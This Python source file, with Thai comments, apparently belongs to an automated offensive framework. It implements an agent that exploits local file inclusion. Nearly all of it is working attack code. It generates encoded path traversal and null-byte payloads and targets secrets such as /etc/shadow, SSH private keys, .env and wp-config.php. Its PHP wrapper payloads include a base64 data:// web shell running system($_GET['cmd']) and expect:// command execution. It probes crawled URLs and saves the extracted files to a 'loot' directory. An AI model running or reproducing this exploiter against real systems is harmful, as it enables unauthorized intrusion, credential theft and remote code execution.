"""
LFIAgent - Local File Inclusion Exploiter
โจมตีช่องโหว่ LFI ด้วยเทคนิคหลากหลาย รวมถึง PHP wrappers และ log poisoning
"""

import asyncio
import hashlib
import os
import re
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, quote
import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy
from core.logger import log


class LFIAgent(BaseAgent):
    """
    Local File Inclusion Exploitation Agent
    
    Features:
    - Path traversal exploitation
    - Depth-based enumeration
    - Null byte injection
    - PHP wrapper exploitation
    - Log poisoning techniques
    - LFI to RCE chains
    - Sensitive file extraction
    - Encoding bypass
    """
    
    supported_phases = [AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv('WORKSPACE_DIR', 'workspace')
        self.results_dir = os.path.join(workspace_dir, 'loot', 'lfi')
        os.makedirs(self.results_dir, exist_ok=True)
        
        self.max_depth = kwargs.get('depth', 10)
        self.null_byte = kwargs.get('null_byte', True)
        self.wrappers = kwargs.get('wrappers', True)
        self.log_poisoning = kwargs.get('log_poisoning', False)
        
        self.vulnerabilities_found = []
        self.extracted_files = []
        
    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute lfi agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _load_sensitive_files(self) -> Dict[str, List[str]]:
        """โหลดรายการไฟล์สำคัญที่ต้องการดึง"""
        # Get target paths from environment (for flexibility)
        target_home = os.getenv('TARGET_HOME_DIR', '/home')
        target_web_root = os.getenv('TARGET_WEB_ROOT', '/var/www/html')
        
        return {
            'linux': [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/group',
                '/etc/hosts',
                '/etc/hostname',
                '/etc/issue',
                '/etc/mysql/my.cnf',
                '/etc/apache2/apache2.conf',
                '/etc/nginx/nginx.conf',
                '/etc/php/7.0/apache2/php.ini',
                '/etc/php/7.4/apache2/php.ini',
                f'{target_web_root}/.env',
                f'{target_web_root}/config.php',
                f'{target_web_root}/wp-config.php',
                f'{target_home}/*/.ssh/id_rsa',
                f'{target_home}/*/.ssh/id_dsa',
                f'{target_home}/*/.bash_history',
                '/root/.ssh/id_rsa',
                '/root/.bash_history',
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/var/log/nginx/access.log',
                '/var/log/nginx/error.log',
                '/proc/self/environ',
                '/proc/self/cmdline',
                '/proc/self/stat',
                '/proc/self/status',
                '/proc/self/fd/0',
                '/proc/self/fd/1',
                '/proc/self/fd/2',
            ],
            
            'windows': [
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\Windows\\win.ini',
                'C:\\Windows\\System.ini',
                'C:\\boot.ini',
                'C:\\Windows\\php.ini',
                'C:\\xampp\\php\\php.ini',
                'C:\\xampp\\apache\\conf\\httpd.conf',
                'C:\\inetpub\\wwwroot\\web.config',
                'C:\\Users\\Administrator\\.ssh\\id_rsa',
            ],
        }
    
    def _generate_traversal_payloads(self, filepath: str, depth: int = 10) -> List[str]:
        """สร้าง path traversal payloads"""
        payloads = []
        
        # Basic traversal
        for i in range(1, depth + 1):
            # Unix-style
            prefix = '../' * i
            payloads.append(prefix + filepath.lstrip('/'))
            
            # Windows-style
            prefix_win = '..\\'  * i
            payloads.append(prefix_win + filepath.lstrip('/').replace('/', '\\'))
            
            # Mixed
            prefix_mixed = '..../' * i
            payloads.append(prefix_mixed + filepath.lstrip('/'))
            
            # Double encoding
            prefix_double = ('../' * i).replace('../', '%252e%252e%252f')
            payloads.append(prefix_double + filepath.lstrip('/'))
            
            # URL encoding
            prefix_encoded = ('../' * i).replace('../', '%2e%2e%2f')
            payloads.append(prefix_encoded + filepath.lstrip('/'))
            
            # UTF-8 encoding
            prefix_utf8 = ('../' * i).replace('../', '%c0%ae%c0%ae/')
            payloads.append(prefix_utf8 + filepath.lstrip('/'))
        
        # Absolute paths
        payloads.append(filepath)
        
        # Null byte injection
        if self.null_byte:
            for payload in list(payloads)[:20]:  # Add null byte to first 20
                payloads.append(payload + '%00')
                payloads.append(payload + '%00.jpg')
                payloads.append(payload + '\x00')
                payloads.append(payload + '\x00.jpg')
        
        # Filter bypass
        payloads.extend([
            filepath.replace('/', ''),
            filepath.replace('../', ''),
            filepath.replace('..', ''),
            os.path.join(os.getenv('TARGET_WEB_ROOT', '/var/www/html'), filepath.lstrip('/')),
        ])
        
        return payloads
    
    def _generate_wrapper_payloads(self, filepath: str) -> List[str]:
        """สร้าง PHP wrapper payloads"""
        if not self.wrappers:
            return []
        
        payloads = []
        
        # php://filter - for source code disclosure
        filters = [
            'convert.base64-encode',
            'string.rot13',
            'string.toupper',
            'string.tolower',
            'convert.iconv.utf-8.utf-16',
        ]
        
        for f in filters:
            payloads.append(f'php://filter/{f}/resource={filepath}')
            payloads.append(f'php://filter/read={f}/resource={filepath}')
        
        # php://input - for code execution (requires POST)
        payloads.append('php://input')
        
        # data:// wrapper
        payloads.extend([
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',  # <?php system($_GET['cmd']); ?>
            'data:text/plain,<?php system($_GET["cmd"]); ?>',
        ])
        
        # expect:// wrapper (if expect extension loaded)
        payloads.append('expect://whoami')
        payloads.append('expect://id')
        
        # zip:// wrapper
        payloads.append('zip://shell.zip#shell.php')
        
        # phar:// wrapper
        payloads.append('phar://shell.phar/shell.php')
        
        return payloads
    
    async def _test_lfi_parameter(
        self,
        url: str,
        param: str,
        original_value: str
    ) -> List[Dict[str, Any]]:
        """ทดสอบ LFI บน parameter"""
        found_vulns = []
        sensitive_files = self._load_sensitive_files()
        
        # Detect OS first
        os_type = 'linux'  # default
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test /etc/passwd first (Linux)
                test_files = ['/etc/passwd', 'C:\\Windows\\win.ini']
                
                for test_file in test_files:
                    payloads = self._generate_traversal_payloads(test_file, self.max_depth)
                    
                    for payload in payloads[:15]:  # Test first 15 payloads
                        test_url = url.replace(f'{param}={original_value}', f'{param}={quote(payload)}')
                        
                        try:
                            async with session.get(test_url, timeout=10) as response:
                                response_text = await response.text()
                                
                                # Check for successful file inclusion
                                if test_file == '/etc/passwd':
                                    if re.search(r'root:.*:0:0:', response_text) or \
                                       re.search(r'nobody:.*:', response_text) or \
                                       re.search(r'www-data:.*:', response_text):
                                        os_type = 'linux'
                                        vuln = {
                                            'type': 'lfi',
                                            'url': test_url,
                                            'parameter': param,
                                            'payload': payload,
                                            'file': test_file,
                                            'evidence': 'Successfully retrieved /etc/passwd',
                                            'os': 'linux',
                                            'severity': 'high'
                                        }
                                        found_vulns.append(vuln)
                                        log.success(f"[LFIAgent] ✓ LFI FOUND: {param} - /etc/passwd")
                                        break
                                
                                elif test_file == 'C:\\Windows\\win.ini':
                                    if '[fonts]' in response_text.lower() or \
                                       '[extensions]' in response_text.lower():
                                        os_type = 'windows'
                                        vuln = {
                                            'type': 'lfi',
                                            'url': test_url,
                                            'parameter': param,
                                            'payload': payload,
                                            'file': test_file,
                                            'evidence': 'Successfully retrieved win.ini',
                                            'os': 'windows',
                                            'severity': 'high'
                                        }
                                        found_vulns.append(vuln)
                                        log.success(f"[LFIAgent] ✓ LFI FOUND: {param} - win.ini")
                                        break
                                
                        except Exception as e:
                            print(f"Error: {e}")
                        
                        await asyncio.sleep(0.2)
                    
                    if found_vulns:
                        break
                
                # If LFI found, extract more sensitive files
                if found_vulns:
                    log.info(f"[LFIAgent] Extracting sensitive files ({os_type})...")
                    
                    target_files = sensitive_files.get(os_type, [])
                    
                    for target_file in target_files[:20]:  # Extract first 20 files
                        payloads = self._generate_traversal_payloads(target_file, self.max_depth)
                        
                        for payload in payloads[:10]:
                            test_url = url.replace(f'{param}={original_value}', f'{param}={quote(payload)}')
                            
                            try:
                                async with session.get(test_url, timeout=10) as response:
                                    response_text = await response.text()
                                    
                                    # Check if file content retrieved
                                    if len(response_text) > 50 and not response_text.startswith('<!DOCTYPE'):
                                        extracted = {
                                            'file': target_file,
                                            'url': test_url,
                                            'payload': payload,
                                            'content': response_text[:1000],  # First 1000 chars
                                            'size': len(response_text)
                                        }
                                        self.extracted_files.append(extracted)
                                        log.success(f"[LFIAgent] ✓ Extracted: {target_file}")
                                        break
                            except Exception as e:
                                print("Error occurred")
                            
                            await asyncio.sleep(0.2)
                
                # Test PHP wrappers
                if self.wrappers and found_vulns:
                    log.info("[LFIAgent] Testing PHP wrappers...")
                    wrapper_payloads = self._generate_wrapper_payloads('/etc/passwd')
                    
                    for payload in wrapper_payloads[:15]:
                        test_url = url.replace(f'{param}={original_value}', f'{param}={quote(payload)}')
                        
                        try:
                            async with session.get(test_url, timeout=10) as response:
                                response_text = await response.text()
                                
                                # Check for base64 encoded content
                                if 'php://filter' in payload and 'base64' in payload:
                                    try:
                                        import base64
                                        decoded = base64.b64decode(response_text).decode('utf-8', errors='ignore')
                                        
                                        if 'root:' in decoded or '<?php' in decoded:
                                            vuln = {
                                                'type': 'lfi_wrapper',
                                                'url': test_url,
                                                'parameter': param,
                                                'payload': payload,
                                                'wrapper': 'php://filter',
                                                'evidence': 'Source code disclosure via wrapper',
                                                'content': decoded[:500],
                                                'severity': 'high'
                                            }
                                            found_vulns.append(vuln)
                                            log.success(f"[LFIAgent] ✓ PHP WRAPPER: {payload[:50]}")
                                    except Exception as e:
                                        print("Error occurred")
                                
                                # Check for code execution via data:// or expect://
                                elif any(w in payload for w in ['data://', 'expect://']):
                                    if any(indicator in response_text.lower() for indicator in ['root', 'uid=', 'www-data']):
                                        vuln = {
                                            'type': 'lfi_to_rce',
                                            'url': test_url,
                                            'parameter': param,
                                            'payload': payload,
                                            'wrapper': payload.split('://')[0] + '://',
                                            'evidence': 'Code execution via wrapper',
                                            'severity': 'critical'
                                        }
                                        found_vulns.append(vuln)
                                        log.success(f"[LFIAgent] ✓ LFI TO RCE: {payload[:50]}")
                        except Exception as e:
                            print("Error occurred")
                        
                        await asyncio.sleep(0.2)
                
        except Exception as e:
            log.error(f"[LFIAgent] Error testing LFI: {e}")
        
        return found_vulns
    
    async def _discover_parameters(self, url: str) -> List[Tuple[str, str]]:
        """ค้นหา parameters ที่น่าสนใจ"""
        params = []
        
        # Parse existing parameters
        from urllib.parse import parse_qs
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        for param, values in query_params.items():
            if values:
                params.append((param, values[0]))
        
        # Common LFI parameter names
        common_params = [
            'file', 'path', 'page', 'include', 'dir', 'document',
            'folder', 'root', 'pg', 'style', 'pdf', 'template',
            'php_path', 'doc', 'load', 'read', 'get', 'src',
        ]
        
        # Add common params if not present
        for param in common_params:
            if param not in [p[0] for p in params]:
                params.append((param, 'index'))
        
        return params
    
    async def run(self, strategy: Strategy = None, **kwargs) -> AgentData:
        """Execute LFI exploitation"""
        log.info("[LFIAgent] Starting LFI exploitation...")
        
        try:
            # Get target URL
            target_url = await self.context_manager.get_context('target_url') if self.context_manager else kwargs.get('target_url')
            
            if not target_url:
                return self.create_report(
                    summary="No target URL provided",
                    errors=["Target URL is required"]
                )
            
            # Get crawled URLs if available
            crawled_urls = []
            if self.context_manager:
                crawled_urls = await self.context_manager.get_context('crawled_urls') or []
            
            # Add base target URL
            test_urls = [target_url] + list(crawled_urls)[:50]  # Test up to 50 URLs
            
            log.info(f"[LFIAgent] Testing {len(test_urls)} URLs for LFI vulnerabilities")
            
            total_vulns = []
            
            for url in test_urls:
                # Discover parameters
                params = await self._discover_parameters(url)
                
                if not params:
                    continue
                
                log.info(f"[LFIAgent] Testing URL: {url}")
                
                for param, original_value in params:
                    vulns = await self._test_lfi_parameter(url, param, original_value)
                    total_vulns.extend(vulns)
                    
                    await asyncio.sleep(0.2)
            
            # Save results
            if total_vulns:
                self._save_vulnerabilities(total_vulns)
                
                # Publish to PubSub
                if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
                    for vuln in total_vulns:
                        await self.orchestrator.pubsub_manager.publish('lfi_vulnerability', vuln)
            
            if self.extracted_files:
                self._save_extracted_files()
            
            # Generate report
            summary = f"LFI testing complete. Found {len(total_vulns)} vulnerabilities, extracted {len(self.extracted_files)} files across {len(test_urls)} URLs."
            log.success(f"[LFIAgent] {summary}")
            
            return self.create_report(
                summary=summary,
                vulnerabilities=total_vulns,
                extracted_files=self.extracted_files,
                total_vulns=len(total_vulns),
                files_extracted=len(self.extracted_files),
                urls_tested=len(test_urls)
            )
            
        except Exception as e:
            log.error(f"[LFIAgent] Error during execution: {e}", exc_info=True)
            return self.create_report(
                summary=f"LFI exploitation failed: {str(e)}",
                errors=[str(e)]
            )
    
    def _save_vulnerabilities(self, vulns: List[Dict[str, Any]]):
        """บันทึกช่องโหว่ที่พบ"""
        try:
            filename = f"lfi_vulns_{hashlib.md5(str(len(vulns)).encode()).hexdigest()[:8]}.txt"
            filepath = os.path.join(self.results_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write("=== LFI VULNERABILITIES FOUND ===\n\n")
                
                for i, vuln in enumerate(vulns, 1):
                    f.write(f"[{i}] {vuln['type'].upper()}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Parameter: {vuln.get('parameter', 'N/A')}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"File: {vuln.get('file', 'N/A')}\n")
                    f.write(f"Evidence: {vuln['evidence']}\n")
                    f.write(f"Severity: {vuln['severity']}\n")
                    
                    if 'content' in vuln:
                        f.write(f"Content Preview:\n{vuln['content']}\n")
                    
                    f.write("\n" + "="*80 + "\n\n")
            
            log.info(f"[LFIAgent] Vulnerabilities saved to: {filepath}")
            
        except Exception as e:
            log.error(f"[LFIAgent] Failed to save vulnerabilities: {e}")
    
    def _save_extracted_files(self):
        """บันทึกไฟล์ที่ดึงมาได้"""
        try:
            for i, extracted in enumerate(self.extracted_files, 1):
                safe_filename = extracted['file'].replace('/', '_').replace('\\', '_').replace(':', '_')
                filename = f"extracted_{i}_{safe_filename}.txt"
                filepath = os.path.join(self.results_dir, filename)
                
                with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(f"=== EXTRACTED FILE: {extracted['file']} ===\n")
                    f.write(f"URL: {extracted['url']}\n")
                    f.write(f"Payload: {extracted['payload']}\n")
                    f.write(f"Size: {extracted['size']} bytes\n")
                    f.write("\n" + "="*80 + "\n\n")
                    f.write(extracted['content'])
            
            log.info(f"[LFIAgent] Extracted files saved to: {self.results_dir}")
            
        except Exception as e:
            log.error(f"[LFIAgent] Failed to save extracted files: {e}")

